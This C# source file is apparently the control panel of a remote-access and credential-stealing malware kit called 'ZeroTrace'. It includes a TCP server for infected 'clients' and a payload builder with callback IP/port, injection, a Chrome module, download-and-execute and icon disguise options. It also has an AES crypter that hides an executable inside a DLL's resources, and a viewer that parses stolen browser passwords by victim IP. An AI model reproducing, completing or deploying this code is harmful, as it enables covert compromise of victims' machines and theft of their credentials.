            label2.Text = clientsTable.Rows.Count.ToString();
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            // Stop server when form is closing
            isServerRunning = false;
            if (tcpServer != null)
            {
                tcpServer.Stop();
            }

            base.OnFormClosing(e);
        }

        #endregion

      
        private void panelControl4_Paint(object sender, PaintEventArgs e)
        {

        }

        private void simpleButton3_Click(object sender, EventArgs e)
        {
          
        }
        private void UpdatePortsLabel()
        {
           
        }
        private void simpleButton1_Click(object sender, EventArgs e)
        {
            if (isServerRunning)
            {
                MessageBox.Show("Server is already running!");
                return;
            }
            try
            {
                // Get port from textEdit1
                if (!int.TryParse(textEdit1.Text, out int port))
                {
                    MessageBox.Show("Please enter a valid port number!");
                    return;
                }
                // Validate port number
                if (port < 1 || port > 65535)
                {
                    MessageBox.Show("Port must be between 1 and 65535!");
                    return;
                }

                // Clear log before starting server
                richTextBox1.Clear();
                LogToMonitor($"Starting server on port {port}...", LogType.System);

                // Start server with the specified port
                StartServer(port);
                label45.Text = port.ToString();

                MessageBox.Show("Your server is running on port " + port.ToString(),
                "Server Information",
                MessageBoxButtons.OK,
                MessageBoxIcon.Information);

                // Update UI
                simpleButton1.Enabled = false;
                simpleButton2.Enabled = true;
                textEdit1.Enabled = false;
            }
            catch (Exception ex)
            {
                LogToMonitor($"Error starting server: {ex.Message}", LogType.Error);
                MessageBox.Show("Error starting server: " + ex.Message);
            }
        }

        private void simpleButton2_Click(object sender, EventArgs e)
        {
            // Stop listening
    if (!isServerRunning)
    {
        MessageBox.Show("Server is not running!");
        return;
    }
    
    try
    {
        LogToMonitor("Stopping server...", LogType.System);
        StopServer();
              

        // Update UI
        simpleButton1.Enabled = true;
        simpleButton2.Enabled = false;
        textEdit1.Enabled = true;
        
        LogToMonitor("Server stopped", LogType.System);
                label45.Text = "0";
            }
    catch (Exception ex)
    {
        LogToMonitor($"Error stopping server: {ex.Message}", LogType.Error);
        MessageBox.Show("Error stopping server: " + ex.Message);
    }
        }

        private void panelControl13_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panelControl23_Paint(object sender, PaintEventArgs e)
        {

        }

        public class RandomStringGenerator
        {
            private static readonly char[] chars =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray();

            public static string Generate(int length)
            {
                var random = new Random();
                var result = new StringBuilder(length);
                for (int i = 0; i < length; i++)
                {
                    result.Append(chars[random.Next(chars.Length)]);
                }
                return result.ToString();
            }
        }
        public  string output = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + RandomStringGenerator.Generate(16) + ".exe";
        private string OpenFileDialogIcon = string.Empty;
        string storedLink = string.Empty;
        private void simpleButton6_Click(object sender, EventArgs e)
        {
            try
            {
                // Clear the terminal
                richTextBox2.Clear();

                // Initialize with a styled header
                AppendColoredText(richTextBox2, "╔══════════════════════════════════════╗\n", SidebarAccentColor);
                AppendColoredText(richTextBox2, "║        ZEROTRACE BUILD PROCESS        ║\n", Color.White);
                AppendColoredText(richTextBox2, "╚══════════════════════════════════════╝\n\n", SidebarAccentColor);

                // Validate inputs
                AppendColoredText(richTextBox2, "⚙️ Validating inputs...\n", Color.Yellow);

                if (string.IsNullOrWhiteSpace(textEdit4.Text) || string.IsNullOrWhiteSpace(textEdit3.Text))
                {
                    AppendColoredText(richTextBox2, "❌ ERROR: IP and Port must be specified.\n", Color.Red);
                    MessageBox.Show("IP and Port must be specified.");
                    return;
                }

                AppendColoredText(richTextBox2, "✓ IP: ", SidebarAccentColor);
                AppendColoredText(richTextBox2, $"{textEdit4.Text}\n", Color.White);

                // Try to parse port to validate it
                if (!int.TryParse(textEdit3.Text, out int port))
                {
                    AppendColoredText(richTextBox2, "❌ ERROR: Port must be a valid number.\n", Color.Red);
                    MessageBox.Show("Port must be a valid number.");
                    return;
                }

                AppendColoredText(richTextBox2, "✓ Port: ", SidebarAccentColor);
                AppendColoredText(richTextBox2, $"{port}\n", Color.White);

                // Generate a new random output filename
                AppendColoredText(richTextBox2, "⚙️ Generating output filename...\n", Color.Yellow);
                string output = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" +
                              RandomStringGenerator.Generate(16) + ".exe";
                AppendColoredText(richTextBox2, "✓ Output: ", SidebarAccentColor);
                AppendColoredText(richTextBox2, $"{output}\n", Color.White);

                // Handle injection option
                string injValue = "0";
                if (checkEdit1.Checked)
                {
                    injValue = "1";
                    AppendColoredText(richTextBox2, "✓ Injection: ", SidebarAccentColor);
                    AppendColoredText(richTextBox2, "ENABLED\n", Color.OrangeRed);
                }
                else
                {
                    AppendColoredText(richTextBox2, "✓ Injection: ", SidebarAccentColor);
                    AppendColoredText(richTextBox2, "DISABLED\n", Color.Gray);
                }

                // Handle Chrome option
                string chrome = "0";
                if (checkEdit2.Checked)
                {
                    chrome = "1";
                    AppendColoredText(richTextBox2, "✓ Chrome Module: ", SidebarAccentColor);
                    AppendColoredText(richTextBox2, "ENABLED\n", Color.OrangeRed);
                }
                else
                {
                    AppendColoredText(richTextBox2, "✓ Chrome Module: ", SidebarAccentColor);
                    AppendColoredText(richTextBox2, "DISABLED\n", Color.Gray);
                }

                // Handle Download & Execute option
                string downloadexecute = "0";
                if (checkEdit3.Checked)
                {
                    AppendColoredText(richTextBox2, "⚙️ Configuring Download & Execute...\n", Color.Yellow);
                    using (Form prompt = new Form())
                    {
                        prompt.Width = 400;
                        prompt.Height = 150;
                        prompt.Text = "Enter a URL";
                        prompt.ShowIcon = false;  // Disable the icon
                        prompt.FormBorderStyle = FormBorderStyle.FixedDialog;  // Make dialog non-resizable
                        prompt.MaximizeBox = false;  // Disable maximize button
                        prompt.MinimizeBox = false;  // Disable minimize button
                        prompt.StartPosition = FormStartPosition.CenterScreen;  // Center on screen

                        Label textLabel = new Label() { Left = 10, Top = 20, Text = "Enter HTTP or HTTPS link:", AutoSize = true };
                        TextBox inputBox = new TextBox() { Left = 10, Top = 50, Width = 360 };
                        Button confirmation = new Button() { Text = "OK", Left = 300, Width = 70, Top = 80 };
                        confirmation.DialogResult = DialogResult.OK;

                        prompt.Controls.Add(textLabel);
                        prompt.Controls.Add(inputBox);
                        prompt.Controls.Add(confirmation);
                        prompt.AcceptButton = confirmation;

                        if (prompt.ShowDialog() == DialogResult.OK)
                        {
                            string input = inputBox.Text;
                            if (Uri.IsWellFormedUriString(input, UriKind.Absolute) &&
                                (input.StartsWith("http://") || input.StartsWith("https://")))
                            {
                                downloadexecute = input;
                                AppendColoredText(richTextBox2, "✓ Download & Execute URL: ", SidebarAccentColor);
                                AppendColoredText(richTextBox2, $"{downloadexecute}\n", Color.White);
                            }
                            else
                            {
                                AppendColoredText(richTextBox2, "❌ ERROR: Invalid link. Must start with http:// or https://\n", Color.Red);
                                MessageBox.Show("Invalid link. Must start with http:// or https://");
                                return;
                            }
                        }
                        else
                        {
                            AppendColoredText(richTextBox2, "❌ Download & Execute canceled by user\n", Color.Red);
                            return;
                        }
                    }
                }
                else
                {
                    AppendColoredText(richTextBox2, "✓ Download & Execute: ", SidebarAccentColor);
                    AppendColoredText(richTextBox2, "DISABLED\n", Color.Gray);
                }
                // Start build process
                AppendColoredText(richTextBox2, "\n⚙️ Starting build process...\n", Color.Yellow);
                AppendProgressBar(richTextBox2, 0);

                // Build stages simulation with progress updates
                for (int i = 1; i <= 10; i++)
                {
                    string stage;

                    switch (i)
                    {
                        case 1:
                            stage = "Loading base stub...";
                            break;
                        case 2:
                            stage = "Reading resources...";
                            break;
                        case 3:
                            stage = "Preparing build environment...";
                            break;
                        case 4:
                            stage = "Configuring connection settings...";
                            break;
                        case 5:
                            stage = "Setting up injection options...";
                            break;
                        case 6:
                            stage = "Configuring chrome module...";
                            break;
                        case 7:
                            stage = "Setting up payload...";
                            break;
                        case 8:
                            stage = "Compiling components...";
                            break;
                        case 9:
                            stage = "Finalizing build...";
                            break;
                        case 10:
                            stage = "Saving executable...";
                            break;
                        default:
                            stage = "Processing...";
                            break;
                    }

                    AppendColoredText(richTextBox2, $"[{i}/10] ", Color.Orange);
                    AppendColoredText(richTextBox2, $"{stage}\n", Color.White);
                    AppendProgressBar(richTextBox2, i * 10);

                    // Use Application.DoEvents to refresh the UI
                    Application.DoEvents();
                    Thread.Sleep(200); // Small delay to make progress visible
                }
                // Call the actual build
                AppendColoredText(richTextBox2, "\n⚙️ Finalizing build...\n", Color.Yellow);
                ZeroTrace.Builder.Build.ModifyAndSaveAssembly(textEdit4.Text, textEdit3.Text, injValue, chrome, downloadexecute, output);

                // Build completed
                AppendColoredText(richTextBox2, "\n✅ BUILD SUCCESSFUL! ✅\n", SidebarAccentColor);
                AppendColoredText(richTextBox2, "📂 Output: ", Color.White);
                AppendColoredText(richTextBox2, $"{output}\n", Color.Yellow);

                // Add build configuration summary
                AppendColoredText(richTextBox2, "\n📋 Build Configuration Summary:\n", SidebarAccentColor);
                AppendColoredText(richTextBox2, "  • IP: ", Color.White);
                AppendColoredText(richTextBox2, $"{textEdit4.Text}\n", SidebarAccentColor);
                AppendColoredText(richTextBox2, "  • Port: ", Color.White);
                AppendColoredText(richTextBox2, $"{textEdit3.Text}\n", SidebarAccentColor);
                AppendColoredText(richTextBox2, "  • Injection: ", Color.White);
                AppendColoredText(richTextBox2, $"{(injValue == "1" ? "Enabled" : "Disabled")}\n", SidebarAccentColor);
                AppendColoredText(richTextBox2, "  • Chrome Module: ", Color.White);
                AppendColoredText(richTextBox2, $"{(chrome == "1" ? "Enabled" : "Disabled")}\n", SidebarAccentColor);
                AppendColoredText(richTextBox2, "  • Download & Execute: ", Color.White);
                AppendColoredText(richTextBox2, $"{(downloadexecute != "0" ? downloadexecute : "Disabled")}\n", SidebarAccentColor);

                AppendColoredText(richTextBox2, "\n⏱️ Build completed at: ", Color.White);
                AppendColoredText(richTextBox2, $"{DateTime.Now:yyyy-MM-dd HH:mm:ss}\n", SidebarAccentColor);

                // Show success message
                MessageBox.Show(
                    "Build completed successfully!\n\n" +
                    "• Output: " + output + "\n",
                    "Build Success",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information
                );


                if (checkEdit4.Checked && !string.IsNullOrEmpty(OpenFileDialogIcon))
                {
                    AppendColoredText(richTextBox2, "⚙️ Injecting custom icon...\n", Color.Yellow);
                    try
                    {
                        Server.Helper.IconInjector.InjectIcon(output, OpenFileDialogIcon);
                        AppendColoredText(richTextBox2, "✓ Custom icon injected successfully\n", SidebarAccentColor);
                    }
                    catch (Exception iconEx)
                    {
                        AppendColoredText(richTextBox2, $"⚠️ Warning: Failed to inject icon: {iconEx.Message}\n", Color.Orange);
                        // Continue with build even if icon injection fails
                    }
                }
            }
            catch (Exception ex)
            {
                AppendColoredText(richTextBox2, "\n❌ BUILD FAILED! ❌\n", Color.Red);
                AppendColoredText(richTextBox2, $"Error: {ex.Message}\n", Color.Red);
                AppendColoredText(richTextBox2, $"Stack Trace: {ex.StackTrace}\n", Color.DarkGray);

                MessageBox.Show($"Build Failed: {ex.Message}");
            }
        }
        private void AppendColoredText(RichTextBox box, string text, Color color)
        {
            box.SelectionStart = box.TextLength;
            box.SelectionLength = 0;
            box.SelectionColor = color;
            box.AppendText(text);
            box.SelectionColor = box.ForeColor;

            // Auto-scroll to the end
            box.ScrollToCaret();
        }

        // Helper method to create a text-based progress bar
        private void AppendProgressBar(RichTextBox box, int percentComplete)
        {
            int barWidth = 50;
            int completedWidth = (int)(barWidth * percentComplete / 100.0);

            StringBuilder sb = new StringBuilder();
            sb.Append('[');

            for (int i = 0; i < barWidth; i++)
            {
                if (i < completedWidth)
                    sb.Append('█');
                else
                    sb.Append('░');
            }

            sb.Append(']');
            sb.Append($" {percentComplete}%");
            sb.Append("\n");

            AppendColoredText(box, sb.ToString(), percentComplete == 100 ? SidebarAccentColor : Color.Orange);
        }

        private void panelControl18_Paint(object sender, PaintEventArgs e)
        {

        }

        private void checkEdit4_CheckedChanged(object sender, EventArgs e)
        {
            if (checkEdit4.Checked)
            {
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Filter = "Icon Files (*.ico)|*.ico";
                    openFileDialog.Title = "Select Icon File";
                    openFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        OpenFileDialogIcon = openFileDialog.FileName;
                        AppendColoredText(richTextBox2, "✓ Custom Icon: ", SidebarAccentColor);
                        AppendColoredText(richTextBox2, $"{Path.GetFileName(OpenFileDialogIcon)}\n", Color.White);

                        textEdit5.Text = Path.GetFileName(OpenFileDialogIcon);
                    }
                    else
                    {
                        // User cancelled dialog, uncheck the checkbox
                        checkEdit4.Checked = false;
                        AppendColoredText(richTextBox2, "❌ Custom icon selection cancelled\n", Color.Red);
                    }
                }
            }
            else
            {
                // Checkbox unchecked, clear the icon path
                OpenFileDialogIcon = string.Empty;
                AppendColoredText(richTextBox2, "✓ Custom Icon: ", SidebarAccentColor);
                AppendColoredText(richTextBox2, "DEFAULT\n", Color.Gray);
            }
        }

        private void simpleButton7_Click(object sender, EventArgs e)
        {
            try
            {
                // Clear the terminal output
                richTextBox3.Clear();
                AppendColoredText(richTextBox3, "⚙️ Starting executable packaging process...\n", Color.Yellow);

                // Ask user to select the executable to encrypt
                string executablePath = string.Empty;
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Filter = "Executable files (*.exe)|*.exe";
                    openFileDialog.Title = "Select Executable to Encrypt";

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        executablePath = openFileDialog.FileName;
                        AppendColoredText(richTextBox3, "✓ Selected executable: ", SidebarAccentColor);
                        AppendColoredText(richTextBox3, $"{executablePath}\n", Color.White);
                    }
                    else
                    {
                        AppendColoredText(richTextBox3, "❌ Operation cancelled by user\n", Color.Red);
                        return;
                    }
                }

                // Generate random encryption key
                AppendColoredText(richTextBox3, "⚙️ Generating encryption key...\n", Color.Yellow);
                byte[] key = new byte[32]; // 256-bit key for AES
                using (var rng = new System.Security.Cryptography.RNGCryptoServiceProvider())
                {
                    rng.GetBytes(key);
                }
                string base64Key = Convert.ToBase64String(key);
                AppendColoredText(richTextBox3, "✓ Encryption key generated\n", SidebarAccentColor);

                // Read the executable file
                AppendColoredText(richTextBox3, "⚙️ Reading executable file...\n", Color.Yellow);
                byte[] executableBytes = File.ReadAllBytes(executablePath);
                AppendColoredText(richTextBox3, $"✓ Read {executableBytes.Length:N0} bytes\n", SidebarAccentColor);

                // Encrypt the executable
                AppendColoredText(richTextBox3, "⚙️ Encrypting executable with AES-256...\n", Color.Yellow);
                byte[] encryptedData = EncryptData(executableBytes, key);
                AppendColoredText(richTextBox3, $"✓ Encrypted size: {encryptedData.Length:N0} bytes\n", SidebarAccentColor);

                // Ask for the DLL template path
                string dllTemplatePath = string.Empty;
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Filter = "DLL files (*.dll)|*.dll";
                    openFileDialog.Title = "Select DLL Template";

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        dllTemplatePath = openFileDialog.FileName;
                        AppendColoredText(richTextBox3, "✓ Selected DLL template: ", SidebarAccentColor);
                        AppendColoredText(richTextBox3, $"{dllTemplatePath}\n", Color.White);
                    }
                    else
                    {
                        AppendColoredText(richTextBox3, "❌ Operation cancelled by user\n", Color.Red);
                        return;
                    }
                }

                // Create output path for the modified DLL
                string outputPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                    $"Packed_{RandomStringGenerator.Generate(8)}.dll");

                // Embed resources in the DLL
                AppendColoredText(richTextBox3, "⚙️ Embedding resources in DLL...\n", Color.Yellow);

                // First, copy the DLL template to the output location
                File.Copy(dllTemplatePath, outputPath, true);
                AppendColoredText(richTextBox3, "✓ Template DLL copied\n", SidebarAccentColor);

                // Now add the resources using WinAPI
                AppendColoredText(richTextBox3, "⚙️ Adding encrypted data as resource...\n", Color.Yellow);
                if (UpdateResource(outputPath, "BINARY", "enc.bin", encryptedData))
                {
                    AppendColoredText(richTextBox3, "✓ Encrypted data embedded successfully\n", SidebarAccentColor);
                }
                else
                {
                    throw new Exception("Failed to embed encrypted data");
                }

                AppendColoredText(richTextBox3, "⚙️ Adding encryption key as resource...\n", Color.Yellow);
                byte[] keyBytes = Encoding.UTF8.GetBytes(base64Key);
                if (UpdateResource(outputPath, "TEXT", "key.txt", keyBytes))
                {
                    AppendColoredText(richTextBox3, "✓ Encryption key embedded successfully\n", SidebarAccentColor);
                }
                else
                {
                    throw new Exception("Failed to embed encryption key");
                }

                AppendColoredText(richTextBox3, "\n✅ PACKAGING COMPLETED! ✅\n", SidebarAccentColor);
                AppendColoredText(richTextBox3, "📂 Output DLL: ", Color.White);
                AppendColoredText(richTextBox3, $"{outputPath}\n", Color.Yellow);

                AppendColoredText(richTextBox3, "\n📋 Summary:\n", SidebarAccentColor);
                AppendColoredText(richTextBox3, "  • Original Size: ", Color.White);
                AppendColoredText(richTextBox3, $"{executableBytes.Length:N0} bytes\n", SidebarAccentColor);
                AppendColoredText(richTextBox3, "  • Encrypted Size: ", Color.White);
                AppendColoredText(richTextBox3, $"{encryptedData.Length:N0} bytes\n", SidebarAccentColor);
                AppendColoredText(richTextBox3, "  • Encryption: ", Color.White);
                AppendColoredText(richTextBox3, "AES-256\n", SidebarAccentColor);

                // Show success message
                MessageBox.Show(
                    $"DLL package created successfully!\n\nOutput: {outputPath}",
                    "Packaging Complete",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information
                );
            }
            catch (Exception ex)
            {
                AppendColoredText(richTextBox3, "\n❌ PACKAGING FAILED! ❌\n", Color.Red);
                AppendColoredText(richTextBox3, $"Error: {ex.Message}\n", Color.Red);
                AppendColoredText(richTextBox3, $"Stack Trace: {ex.StackTrace}\n", Color.DarkGray);

                MessageBox.Show($"Error packaging executable: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

        }
        private byte[] EncryptData(byte[] data, byte[] key)
        {
            using (var aes = System.Security.Cryptography.Aes.Create())
            {
                aes.Key = key;
                aes.GenerateIV(); // Generate random IV

                using (var memoryStream = new MemoryStream())
                {
                    // First write the IV so we can retrieve it later
                    memoryStream.Write(aes.IV, 0, aes.IV.Length);

                    using (var cryptoStream = new CryptoStream(
                        memoryStream,
                        aes.CreateEncryptor(),
                        CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(data, 0, data.Length);
                        cryptoStream.FlushFinalBlock();
                    }

                    return memoryStream.ToArray();
                }
            }
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr BeginUpdateResource(string pFileName, [MarshalAs(UnmanagedType.Bool)] bool bDeleteExistingResources);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool UpdateResourceW(IntPtr hUpdate, string lpType, string lpName, ushort wLanguage, byte[] lpData, uint cbData);

        // Helper method to update a resource in a PE file
        private bool UpdateResource(string filePath, string type, string name, byte[] data)
        {
            // Begin the update session
            IntPtr hUpdate = BeginUpdateResource(filePath, false);
            if (hUpdate == IntPtr.Zero)
            {
                int error = Marshal.GetLastWin32Error();
                AppendColoredText(richTextBox3, $"❌ BeginUpdateResource failed with error: {error}\n", Color.Red);
                return false;
            }

            try
            {
                // Update the resource
                if (!UpdateResourceW(hUpdate, type, name, 0, data, (uint)data.Length))
                {
                    int error = Marshal.GetLastWin32Error();
                    AppendColoredText(richTextBox3, $"❌ UpdateResourceW failed with error: {error}\n", Color.Red);
                    EndUpdateResource(hUpdate, true); // Discard changes
                    return false;
                }

                // Commit the changes
                if (!EndUpdateResource(hUpdate, false))
                {
                    int error = Marshal.GetLastWin32Error();
                    AppendColoredText(richTextBox3, $"❌ EndUpdateResource failed with error: {error}\n", Color.Red);
                    return false;
                }

                return true;
            }
            catch (Exception ex)
            {
                AppendColoredText(richTextBox3, $"❌ Exception during resource update: {ex.Message}\n", Color.Red);
                EndUpdateResource(hUpdate, true); // Discard changes
                return false;
            }
        }
        private void simpleButton3_Click_1(object sender, EventArgs e)
        {
            try
            {
                // Create a DataTable to store the password entries
                DataTable passwordTable = new DataTable();
                passwordTable.Columns.Add("URL", typeof(string));
                passwordTable.Columns.Add("WebBrowser", typeof(string));
                passwordTable.Columns.Add("UserName", typeof(string));
                passwordTable.Columns.Add("Password", typeof(string));
                passwordTable.Columns.Add("Strength", typeof(string));
                passwordTable.Columns.Add("CreatedTime", typeof(string));
                passwordTable.Columns.Add("ClientIP", typeof(string));

                // Get the Clients folder path
                string clientsFolder = Path.Combine(Application.StartupPath, "Clients");
                if (!Directory.Exists(clientsFolder))
                {
                    MessageBox.Show("Clients folder not found!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                int totalPasswords = 0;
                int processedFolders = 0;
                int totalFolders = Directory.GetDirectories(clientsFolder).Length;

                // Show progress form
                using (Form progressForm = new Form())
                {
                    progressForm.Text = "Processing Password Files";
                    progressForm.Width = 400;
                    progressForm.Height = 150;
                    progressForm.FormBorderStyle = FormBorderStyle.FixedDialog;
                    progressForm.StartPosition = FormStartPosition.CenterScreen;
                    progressForm.MaximizeBox = false;
                    progressForm.MinimizeBox = false;
                    progressForm.ShowIcon = false;

                    Label statusLabel = new Label { Left = 20, Top = 20, Width = 360, Text = "Scanning client folders..." };
                    ProgressBar progressBar = new ProgressBar { Left = 20, Top = 50, Width = 360, Height = 20, Minimum = 0, Maximum = 100, Value = 0 };
                    Label countLabel = new Label { Left = 20, Top = 80, Width = 360, Text = "Found: 0 passwords" };

                    progressForm.Controls.Add(statusLabel);
                    progressForm.Controls.Add(progressBar);
                    progressForm.Controls.Add(countLabel);

                    // Start the processing in a background thread
                    Thread workerThread = new Thread(() =>
                    {
                        // Process each client folder
                        foreach (string clientFolder in Directory.GetDirectories(clientsFolder))
                        {
                            string clientIP = Path.GetFileName(clientFolder).Replace('_', '.');
                            statusLabel.Invoke((MethodInvoker)delegate {
                                statusLabel.Text = $"Processing client: {clientIP}";
                            });

                            // Find all zip files in the client folder
                            var zipFiles = Directory.GetFiles(clientFolder, "*.zip");
                            foreach (string zipFile in zipFiles)
                            {
                                try
                                {
                                    using (ZipArchive archive = ZipFile.OpenRead(zipFile))
                                    {
                                        // Find password files in the zip - UPDATED to match your actual filenames
                                        var passwordEntries = archive.Entries.Where(entry =>
                                            entry.Name.Equals("ChromeV20Passwords.txt", StringComparison.OrdinalIgnoreCase) ||
                                            entry.Name.Equals("GetAllPasswords.txt", StringComparison.OrdinalIgnoreCase));

                                        foreach (var entry in passwordEntries)
                                        {
                                            using (StreamReader reader = new StreamReader(entry.Open()))
                                            {
                                                string line;
                                                Dictionary<string, string> currentEntry = null;

                                                while ((line = reader.ReadLine()) != null)
                                                {
                                                    if (line == "==================================================")
                                                    {
                                                        // Start of a new entry or end of current entry
                                                        if (currentEntry != null && currentEntry.Count > 0)
                                                        {
                                                            // Add completed entry to our DataTable
                                                            DataRow row = passwordTable.NewRow();

                                                            row["URL"] = currentEntry.ContainsKey("URL") ? currentEntry["URL"].Trim() : "";
                                                            row["WebBrowser"] = currentEntry.ContainsKey("Web Browser") ? currentEntry["Web Browser"].Trim() : "";
                                                            row["UserName"] = currentEntry.ContainsKey("User Name") ? currentEntry["User Name"].Trim() : "";
                                                            row["Password"] = currentEntry.ContainsKey("Password") ? currentEntry["Password"].Trim() : "";
                                                            row["Strength"] = currentEntry.ContainsKey("Password Strength") ? currentEntry["Password Strength"].Trim() : "";
                                                            row["CreatedTime"] = currentEntry.ContainsKey("Created Time") ? currentEntry["Created Time"].Trim() : "";
                                                            row["ClientIP"] = clientIP;

                                                            passwordTable.Rows.Add(row);
                                                            totalPasswords++;

                                                            // Update count label
                                                            countLabel.Invoke((MethodInvoker)delegate {
                                                                countLabel.Text = $"Found: {totalPasswords} passwords";
                                                            });
                                                        }

                                                        // Start a new entry
                                                        currentEntry = new Dictionary<string, string>();
                                                    }
                                                    else if (currentEntry != null && line.Contains(":"))
                                                    {
                                                        // Parse key-value pairs
                                                        int colonIndex = line.IndexOf(':');
                                                        if (colonIndex > 0)
                                                        {
                                                            string key = line.Substring(0, colonIndex).Trim();
                                                            string value = line.Substring(colonIndex + 1).Trim();
                                                            currentEntry[key] = value;
                                                        }
                                                    }
                                                }

                                                // Handle the last entry if there is one
                                                if (currentEntry != null && currentEntry.Count > 0)
                                                {
                                                    DataRow row = passwordTable.NewRow();

                                                    row["URL"] = currentEntry.ContainsKey("URL") ? currentEntry["URL"].Trim() : "";
                                                    row["WebBrowser"] = currentEntry.ContainsKey("Web Browser") ? currentEntry["Web Browser"].Trim() : "";
                                                    row["UserName"] = currentEntry.ContainsKey("User Name") ? currentEntry["User Name"].Trim() : "";
                                                    row["Password"] = currentEntry.ContainsKey("Password") ? currentEntry["Password"].Trim() : "";
                                                    row["Strength"] = currentEntry.ContainsKey("Password Strength") ? currentEntry["Password Strength"].Trim() : "";
                                                    row["CreatedTime"] = currentEntry.ContainsKey("Created Time") ? currentEntry["Created Time"].Trim() : "";
                                                    row["ClientIP"] = clientIP;

                                                    passwordTable.Rows.Add(row);
                                                    totalPasswords++;

                                                    // Update count label
                                                    countLabel.Invoke((MethodInvoker)delegate {
                                                        countLabel.Text = $"Found: {totalPasswords} passwords";
                                                    });
                                                }
                                            }
                                        }
                                    }
                                }
                                catch (Exception zipEx)
                                {
                                    // Log error but continue processing
                                    Console.WriteLine($"Error processing zip file {zipFile}: {zipEx.Message}");
                                }
                            }

                            processedFolders++;
                            int progressValue = (int)((float)processedFolders / totalFolders * 100);

                            // Update progress bar
                            progressBar.Invoke((MethodInvoker)delegate {
                                progressBar.Value = progressValue;
                            });
                        }

                        // Signal completion and close the progress form
                        progressForm.Invoke((MethodInvoker)delegate {
                            progressForm.DialogResult = DialogResult.OK;
                        });
                    });

                    workerThread.IsBackground = true;
                    workerThread.Start();

                    // Show the form and wait for completion
                    if (progressForm.ShowDialog() == DialogResult.OK)
                    {
                        // Display the results in the grid
                        gridControl2.DataSource = passwordTable;

                        // Configure grid view for better visualization
                        var gridView = gridControl2.MainView as DevExpress.XtraGrid.Views.Grid.GridView;
                        if (gridView != null)
                        {
                            // Auto-size columns
                            gridView.BestFitColumns();

                            // Add column sorting
                            foreach (DevExpress.XtraGrid.Columns.GridColumn column in gridView.Columns)
                            {
                                column.SortMode = DevExpress.XtraGrid.ColumnSortMode.Value;
                            }

                            // Set up search functionality with textEdit2 to search in multiple columns
                            textEdit2.TextChanged += (sender2, args) =>
                            {
                                string searchText = textEdit2.Text.ToLowerInvariant();

                                if (string.IsNullOrWhiteSpace(searchText))
                                {
                                    // Clear filter if search box is empty
                                    gridView.ClearColumnsFilter();
                                }
                                else
                                {
                                    // Filter in URL, UserName, and Password columns
                                    gridView.ActiveFilterString =
                                        $"[URL] LIKE '%{searchText}%' OR " +
                                        $"[UserName] LIKE '%{searchText}%' OR " +
                                        $"[Password] LIKE '%{searchText}%'";
                                }
                            };
                        }

                        if (totalPasswords > 0)
                        {
                            // Show result information
                            MessageBox.Show(
                                $"Password scan completed!\n\nFound {totalPasswords} passwords from {totalFolders} clients.",
                                "Scan Results",
                                MessageBoxButtons.OK,
                                MessageBoxIcon.Information
                            );
                        }
                        else
                        {
                            MessageBox.Show(
                                "No passwords found. Please check that files exist inside the client ZIP files.",
                                "Scan Results",
                                MessageBoxButtons.OK,
                                MessageBoxIcon.Information
                            );
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error processing password files: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void simpleButton4_Click(object sender, EventArgs e)
        {
            try
            {
                // Setup the file manager using DevExpress grid properly
                string clientsFolder = Path.Combine(Application.StartupPath, "Clients");
                if (!Directory.Exists(clientsFolder))
                {
                    MessageBox.Show("Clients folder not found!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                // Set up file manager if not already done
                SetupFileManager();

                // Navigate to Clients folder
                NavigateToFolder(clientsFolder);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error initializing file manager: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void InitializeAdditionalNavigationPages()
        {
            autoTasksTabPage = new DevExpress.XtraTab.XtraTabPage();
            autoTasksTabPage.Name = "autoTasksTabPage";
            autoTasksTabPage.Text = "Auto Tasks";
            autoTasksTabPage.BackColor = ColorTranslator.FromHtml("#262626");

            notificationsTabPage = new DevExpress.XtraTab.XtraTabPage();
            notificationsTabPage.Name = "notificationsTabPage";
            notificationsTabPage.Text = "Notifications";
            notificationsTabPage.BackColor = ColorTranslator.FromHtml("#262626");

            pluginManagerTabPage = CreateBlankNavigationPage("pluginManagerTabPage", "Plugin Manager");
            blockedConnectionsTabPage = CreateBlankNavigationPage("blockedConnectionsTabPage", "Blocked Connections");

            xtraTabControl1.TabPages.Add(autoTasksTabPage);
            xtraTabControl1.TabPages.Add(notificationsTabPage);
            xtraTabControl1.TabPages.Add(pluginManagerTabPage);
            xtraTabControl1.TabPages.Add(blockedConnectionsTabPage);

            autoTasksNavigationElement = CreateNavigationItem("autoTasksNavigationElement", "Auto Tasks");
            autoTasksNavigationElement.Click += autoTasksNavigationElement_Click;

            notificationsNavigationElement = CreateNavigationItem("notificationsNavigationElement", "Notifications");
            notificationsNavigationElement.Click += notificationsNavigationElement_Click;

